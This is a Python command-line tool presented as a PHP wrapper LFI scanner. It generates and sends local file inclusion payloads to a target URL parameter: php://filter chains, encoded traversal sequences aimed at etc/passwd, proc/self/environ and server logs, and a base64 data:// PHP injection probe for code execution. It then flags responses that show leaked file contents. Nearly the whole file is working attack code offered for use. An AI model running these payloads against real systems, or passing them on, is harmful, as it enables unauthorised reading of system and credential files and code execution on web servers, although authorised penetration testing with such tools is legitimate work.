#!/usr/bin/env python3

import requests
import argparse
import urllib.parse
import base64
import itertools
import time
import signal
from typing import List, Dict, Generator, Optional
from dataclasses import dataclass

class Banner:
    @staticmethod
    def show():
        print(f"""
\033[96m
                           _          _____      
 __      ___ __ __ _ _ __ | |__  _ __|___ / _ __ 
 \ \ /\ / / '__/ _` | '_ \| '_ \| '_ \ |_ \| '__|
  \ V  V /| | | (_| | |_) | | | | |_) |__) | |   
   \_/\_/ |_|  \__,_| .__/|_| |_| .__/____/|_|   
                    |_|         |_|              
\033[0m
        \033[93mLFI Wrapper Scanner\033[0m
        \033[94mPHP Wrapper-based LFI Detection Tool\033[0m
        \033[95mAuthor: csshark\033[0m
        """)
class HTTPClient:
    def __init__(self, proxy: Optional[str] = None, follow_redirects: bool = False):
        self.session = requests.Session()
        self.session.verify = False
        self.follow_redirects = follow_redirects

        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}

        self.session.headers.update({
            "User-Agent": "Mozilla/5.0"
        })

    def get(self, url: str, timeout: int = 5) -> Optional[requests.Response]:
        try:
            return self.session.get(url, timeout=timeout, allow_redirects=self.follow_redirects)
        except requests.RequestException:
            return None


class PayloadGenerator:
    BASE_WRAPPERS = [
        "php://filter",
        "data://",
        "zip://",
        "phar://",
        "compress.zlib://",
        "compress.bzip2://",
        "file://"
    ]

    FILTER_CHAINS = [
        "convert.base64-encode",
        "string.rot13",
        "convert.iconv.utf-8.utf-16",
        "convert.iconv.utf-16.utf-8",
        "convert.quoted-printable-encode"
    ]

    TRAVERSALS = [
        "../",
        "..//",
        "..%2f",
        "%2e%2e/",
        "..%252f"
    ]

    FILE_TARGETS = [
        "etc/passwd",
        "etc/hosts",
        "proc/self/environ",
        "var/log/apache2/access.log",
        "var/log/nginx/access.log",
        "windows/win.ini",
        "windows/system32/drivers/etc/hosts"
    ]

    @staticmethod
    def encode_variants(path: str) -> List[str]:
        return [
            path,
            urllib.parse.quote(path),
            urllib.parse.quote(urllib.parse.quote(path))
        ]

    @staticmethod
    def generate_filter_chains() -> List[str]:
        chains = []
        for r in range(1, 3):
            for combo in itertools.permutations(PayloadGenerator.FILTER_CHAINS, r):
                chains.append("|".join(combo))
        return chains

    @staticmethod
    def generate() -> Generator[str, None, None]:
        filter_chains = PayloadGenerator.generate_filter_chains()

        for wrapper in PayloadGenerator.BASE_WRAPPERS:
            for traversal in PayloadGenerator.TRAVERSALS:
                for file in PayloadGenerator.FILE_TARGETS:
                    for encoded in PayloadGenerator.encode_variants(file):
                        path = traversal + encoded

                        if wrapper == "php://filter":
                            for chain in filter_chains:
                                yield f"{wrapper}/{chain}/resource={path}"
                        else:
                            yield f"{wrapper}/{path}"

        php_payload = base64.b64encode(b"<?php echo 'VULN'; ?>").decode()
        yield f"data://text/plain;base64,{php_payload}"


class ResponseAnalyzer:
    INDICATORS = {
        "root:x:0:0": "LFI",
        "daemon:x:1:1": "LFI",
        "VULN": "RCE",
        "uid=": "RCE",
        "[extensions]": "LFI",
        "localhost": "LFI"
    }

    @staticmethod
    def is_base64(s: str) -> bool:
        try:
            base64.b64decode(s[:200])
            return True
        except Exception:
            return False

    @staticmethod
    def analyze(content: str) -> Optional[str]:
        for pattern, vuln_type in ResponseAnalyzer.INDICATORS.items():
            if pattern in content:
                return vuln_type

        if ResponseAnalyzer.is_base64(content):
            try:
                decoded = base64.b64decode(content[:500]).decode(errors="ignore")
                for pattern, vuln_type in ResponseAnalyzer.INDICATORS.items():
                    if pattern in decoded:
                        return f"{vuln_type}(base64)"
            except Exception:
                pass

        return None


@dataclass
class Finding:
    payload: str
    vuln_type: str


class LFIScanner:
    def __init__(self, client: HTTPClient, delay: float = 0.1):
        self.client = client
        self.delay = delay
        self.stop = False
        self.findings: List[Finding] = []

        signal.signal(signal.SIGINT, self._handle_stop)

    def _handle_stop(self, *_):
        self.stop = True

    def scan(self, url: str, param: str):
        payloads = PayloadGenerator.generate()

        for i, payload in enumerate(payloads, 1):
            if self.stop:
                break

            full_url = f"{url}?{param}={urllib.parse.quote(payload)}"
            response = self.client.get(full_url)

            if not response or response.status_code != 200:
                continue

            vuln = ResponseAnalyzer.analyze(response.text)

            if vuln:
                print(f"[+] {vuln} -> {payload}")
                self.findings.append(Finding(payload, vuln))

            time.sleep(self.delay)

        self.summary()

    def summary(self):
        print("\n=== SUMMARY ===")
        print(f"Findings: {len(self.findings)}")
        for f in self.findings:
            print(f"{f.vuln_type}: {f.payload}")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("url")
    parser.add_argument("param")
    parser.add_argument("--proxy")
    parser.add_argument("--delay", type=float, default=0.1)
    parser.add_argument("--follow-redirects", action="store_true")

    args = parser.parse_args()

    Banner.show()

    client = HTTPClient(proxy=args.proxy, follow_redirects=args.follow_redirects)
    scanner = LFIScanner(client, delay=args.delay)
    scanner.scan(args.url, args.param)
